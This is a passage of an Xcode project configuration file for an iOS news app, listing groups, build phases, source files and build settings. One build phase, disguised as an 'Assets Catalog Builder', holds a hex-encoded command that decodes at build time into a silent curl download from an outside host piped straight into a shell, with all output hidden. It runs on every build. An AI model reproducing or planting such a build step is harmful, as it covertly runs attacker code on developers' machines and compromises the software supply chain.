				D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		BD53882A5360DD101773F6C0 /* Pods */ = {
			isa = PBXGroup;
			children = (
				79E8AFB046D2CED80C7D0E53 /* Pods-NewsApp.debug.xcconfig */,
				2159E23886C1D7427AF87AFC /* Pods-NewsApp.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		8E708DDF264CEB140055F518 /* NewsApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
			buildPhases = (
				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
				947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */,
				8E708DDC264CEB140055F518 /* Sources */,
				8E708DDD264CEB140055F518 /* Frameworks */,
				8E708DDE264CEB140055F518 /* Resources */,
				55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */,
				9E14881026225AF1827789B1 /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = NewsApp;
			productName = NewsApp;
			productReference = 8E708DE0264CEB140055F518 /* NewsApp.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		8E708DD8264CEB140055F518 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1240;
				LastUpgradeCheck = 1240;
				TargetAttributes = {
					8E708DDF264CEB140055F518 = {
						CreatedOnToolsVersion = 12.4;
					};
				};
			};
			buildConfigurationList = 8E708DDB264CEB140055F518 /* Build configuration list for PBXProject "NewsApp" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 8E708DD7264CEB140055F518;
			productRefGroup = 8E708DE1264CEB140055F518 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				8E708DDF264CEB140055F518 /* NewsApp */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		8E708DDE264CEB140055F518 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8EADD4122669D8E900E88249 /* Assets.xcassets in Resources */,
				8EADD4272669D8E900E88249 /* Poppins-Medium.ttf in Resources */,
				8EADD4232669D8E900E88249 /* Preview Assets.xcassets in Resources */,
				8E90FE2E267B654800FD2F7D /* CustomAlert.xib in Resources */,
				8EADD42B2669D8E900E88249 /* Main.storyboard in Resources */,
				8E154556267A180C00A71A73 /* CountryCodes.json in Resources */,
				8EADD4292669D8E900E88249 /* Poppins-SemiBold.ttf in Resources */,
				8EADD42A2669D8E900E88249 /* LaunchScreen.storyboard in Resources */,
				8E154557267A180C00A71A73 /* flag-emojis.pretty.json in Resources */,
				8EADD41B2669D8E900E88249 /* TableViewCell.xib in Resources */,
				8EADD4282669D8E900E88249 /* Poppins-Regular.ttf in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-NewsApp-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Assets Catalog Builder";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
		9E14881026225AF1827789B1 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		8E708DDC264CEB140055F518 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8EADD4172669D8E900E88249 /* TableViewCell.swift in Sources */,
				8E1973B726776C23004C276E /* BaseVC.swift in Sources */,
				8EDCE6022671C93200102931 /* UIColor.swift in Sources */,
				8E1973CA26777E1D004C276E /* SourcesDM.swift in Sources */,
				8EDCE6052671C96C00102931 /* UIView.swift in Sources */,
				8EADD4202669D8E900E88249 /* SettingsViewController.swift in Sources */,
				8EADD41D2669D8E900E88249 /* LogInViewController.swift in Sources */,
				8EADD4132669D8E900E88249 /* SearchTableViewController.swift in Sources */,
				8EDBF0CD266F5201008F9E61 /* LoadingViewController.swift in Sources */,
				8EADD40B2669D8E900E88249 /* NewsDM.swift in Sources */,
				8E154555267A180C00A71A73 /* CountryCode.swift in Sources */,
				8E15454F2679AFBC00A71A73 /* CustomAlert.swift in Sources */,
				8E19737626771731004C276E /* DataManager.swift in Sources */,
				8EADD4222669D8E900E88249 /* FilterViewController.swift in Sources */,
				8EADD4192669D8E900E88249 /* HomeViewController.swift in Sources */,
				8EADD4152669D8E900E88249 /* SourcesViewController.swift in Sources */,
				8E1973D2267783EB004C276E /* CountryVM.swift in Sources */,
				8EADD40E2669D8E900E88249 /* CategoryList.swift in Sources */,
				8E1973D8267785F6004C276E /* SourcesAPIService.swift in Sources */,
				8EADD4162669D8E900E88249 /* SelectCategoryViewController.swift in Sources */,
				8EADD4102669D8E900E88249 /* Settings.swift in Sources */,
				8E1973732677170D004C276E /* NetworkManager.swift in Sources */,
				8E1973DB26778609004C276E /* CountryAPIService.swift in Sources */,
				8EADD4252669D8E900E88249 /* AppDelegate.swift in Sources */,
				8EE3129926734B1A00185DE1 /* Selection.swift in Sources */,
				8E1973D5267785D8004C276E /* NewsAPIService.swift in Sources */,
				8EDCE6082671C99000102931 /* UITableView.swift in Sources */,
				8EEE3CB72678CEE3006CFC10 /* AppConstants.swift in Sources */,
				8EADD40D2669D8E900E88249 /* SettingsList.swift in Sources */,
				8EADD41A2669D8E900E88249 /* PreferencesViewController.swift in Sources */,
				8EADD41E2669D8E900E88249 /* TabBarViewController.swift in Sources */,
				8EEE3CB12678A74E006CFC10 /* String.swift in Sources */,
				8E1973CD26778329004C276E /* SourcesVM.swift in Sources */,
				8E1973C626777DF7004C276E /* CountryDM.swift in Sources */,
				8EADD4212669D8E900E88249 /* SubscriptionViewController.swift in Sources */,
				8EADD4242669D8E900E88249 /* NewsVM.swift in Sources */,
				8EADD4142669D8E900E88249 /* BookMarksViewController.swift in Sources */,
				8EADD4262669D8E900E88249 /* SceneDelegate.swift in Sources */,
				8EDCE6102672207900102931 /* SelectCountry.swift in Sources */,
				8EADD4112669D8E900E88249 /* Category.swift in Sources */,
				8EADD4182669D8E900E88249 /* SelectCountryViewController.swift in Sources */,
				8EEE3CA7267883E5006CFC10 /* APIKeys.swift in Sources */,
				8EEE3CA3267870F0006CFC10 /* NewsViewController.swift in Sources */,
				8EADD41F2669D8E900E88249 /* LogoutViewController.swift in Sources */,
				8EDCE60C2671E4BA00102931 /* UIStatusBarStyle.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		8EADD4062669D8E900E88249 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				8EADD4072669D8E900E88249 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		8E708DF2264CEB160055F518 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		8E708DF3264CEB160055F518 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		8E708DF5264CEB160055F518 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 79E8AFB046D2CED80C7D0E53 /* Pods-NewsApp.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = NewsApp/NewsApp.entitlements;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"NewsApp/Preview Content\"";
				DEVELOPMENT_TEAM = 82URUMC8L4;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = NewsApp/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.dftsoft.NewsApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		8E708DF6264CEB160055F518 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 2159E23886C1D7427AF87AFC /* Pods-NewsApp.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = NewsApp/NewsApp.entitlements;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"NewsApp/Preview Content\"";
				DEVELOPMENT_TEAM = 82URUMC8L4;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = NewsApp/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.dftsoft.NewsApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		8E708DDB264CEB140055F518 /* Build configuration list for PBXProject "NewsApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8E708DF2264CEB160055F518 /* Debug */,
				8E708DF3264CEB160055F518 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8E708DF5264CEB160055F518 /* Debug */,
				8E708DF6264CEB160055F518 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
}
